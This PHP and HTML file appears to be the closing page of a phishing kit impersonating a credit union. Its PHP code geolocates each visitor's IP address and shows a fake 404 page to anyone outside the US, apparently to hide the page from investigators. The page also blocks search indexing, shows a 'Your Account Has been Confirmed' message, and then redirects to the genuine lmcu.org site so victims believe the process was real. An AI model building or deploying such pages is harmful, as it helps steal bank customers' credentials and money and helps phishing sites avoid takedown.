<?php


$IPaddress=$_SERVER['REMOTE_ADDR'];
$two_letter_country_code=iptocountry($IPaddress);

if ($two_letter_country_code!=="US"){
    header('HTTP/1.1 404 Not Found');
    include '../404.php';
    exit();
    }

function iptocountry($ip) {   
    $numbers = preg_split( "/\./", $ip);   
    include("../ip_files/".$numbers[0].".php");
    $code=($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);   
    foreach($ranges as $key => $value){
        if($key<=$code){
            if($ranges[$key][0]>=$code){$two_letter_country_code=$ranges[$key][1];break;}
            }
    }
    if ($two_letter_country_code==""){$two_letter_country_code="unkown";}
    return $two_letter_country_code;
}


?>



<html>
<head>
<title>Login</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link href="../Images/favicon-60ece86de211be04d011746e7e7f9a4f.ico"rel="icon"></link>

<!-- Billing Form -->
<META HTTP-EQUIV="Refresh" CONTENT="10;URL=https://www.lmcu.org/">  
<div id="billing" 
style="position:absolute;left:37%;top:23%;width:300px;height:200px;">
<img src="../Images/tick_1.png" style="display:block;margin-left:33%;width:150;height:160px;">
<h2 style="font-size:17px;display:block;margin-left:15%;width:100%">Your Account 
Has been Confirmed</h2>
</div>
</form>


</html>
